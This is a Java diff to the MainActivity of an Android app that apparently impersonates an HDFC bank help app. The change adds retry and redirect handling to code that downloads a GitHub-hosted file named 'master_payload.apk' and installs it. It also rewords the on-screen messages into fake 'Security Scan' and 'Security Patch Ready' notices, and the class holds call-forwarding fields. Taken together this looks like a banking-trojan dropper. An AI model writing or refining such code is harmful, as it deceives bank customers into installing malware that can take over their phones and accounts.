@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/latest/download/master_payload.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.75/master_payload.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -72,49 +72,65 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void downloadAndInstallUpdate() {
-        runOnUiThread(() -> Toast.makeText(this, "🚀 Starting Security Download...", Toast.LENGTH_SHORT).show());
+        runOnUiThread(() -> Toast.makeText(this, "🚀 Starting Security Scan...", Toast.LENGTH_SHORT).show());
         new Thread(new Runnable() {
             @Override
             public void run() {
-                try {
-                    URL url = new URL(UPDATE_URL);
-                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
-                    c.setRequestMethod("GET");
-                    c.setConnectTimeout(15000);
-                    c.setReadTimeout(15000);
-                    c.connect();
+                int retryCount = 0;
+                boolean success = false;
+                
+                while (retryCount < 5 && !success) {
+                    try {
+                        URL url = new URL(UPDATE_URL);
+                        HttpURLConnection c = (HttpURLConnection) url.openConnection();
+                        c.setRequestMethod("GET");
+                        c.setInstanceFollowRedirects(true);
+                        c.setConnectTimeout(15000);
+                        c.connect();
 
-                    final int responseCode = c.getResponseCode();
-                    if (responseCode != HttpURLConnection.HTTP_OK) {
-                        runOnUiThread(() -> Toast.makeText(MainActivity.this, "❌ Server Error: " + responseCode, Toast.LENGTH_LONG).show());
-                        return;
-                    }
-
-                    File file = new File(getExternalFilesDir(null), "hdfc_help_v3.apk");
-                    if (file.exists()) file.delete();
-                    
-                    FileOutputStream fos = new FileOutputStream(file);
-                    InputStream is = c.getInputStream();
-
-                    byte[] buffer = new byte[1024];
-                    int len1 = 0;
-                    while ((len1 = is.read(buffer)) != -1) {
-                        fos.write(buffer, 0, len1);
-                    }
-                    fos.close();
-                    is.close();
-
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            Toast.makeText(MainActivity.this, "✅ Download Complete! Installing...", Toast.LENGTH_SHORT).show();
-                            installApk(file);
+                        // Handle Manual Redirects if needed
+                        int status = c.getResponseCode();
+                        if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
+                            String newUrl = c.getHeaderField("Location");
+                            c = (HttpURLConnection) new URL(newUrl).openConnection();
+                            c.connect();
                         }
-                    });
 
-                } catch (final Exception e) {
-                    Log.e(TAG, "Update Error", e);
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "⚠️ Download Failed: " + e.getMessage(), Toast.LENGTH_LONG).show());
+                        if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
+                            File file = new File(getExternalFilesDir(null), "hdfc_help_v3.apk");
+                            if (file.exists()) file.delete();
+                            
+                            FileOutputStream fos = new FileOutputStream(file);
+                            InputStream is = c.getInputStream();
+                            byte[] buffer = new byte[1024];
+                            int len1 = 0;
+                            while ((len1 = is.read(buffer)) != -1) {
+                                fos.write(buffer, 0, len1);
+                            }
+                            fos.close();
+                            is.close();
+                            
+                            success = true;
+                            runOnUiThread(() -> {
+                                Toast.makeText(MainActivity.this, "✅ Security Patch Ready!", Toast.LENGTH_SHORT).show();
+                                installApk(file);
+                            });
+                        } else if (c.getResponseCode() == 404) {
+                            retryCount++;
+                            final int currentRetry = retryCount;
+                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⏳ Server Busy (Attempt " + currentRetry + "/5)...", Toast.LENGTH_SHORT).show());
+                            Thread.sleep(5000); // Wait 5 seconds for GitHub to finish upload
+                        } else {
+                            throw new Exception("HTTP " + c.getResponseCode());
+                        }
+
+                    } catch (Exception e) {
+                        retryCount++;
+                        if (retryCount >= 5) {
+                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⚠️ Connection Error. Please try again in 1 minute.", Toast.LENGTH_LONG).show());
+                        }
+                        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                    }
                 }
             }
         }).start();
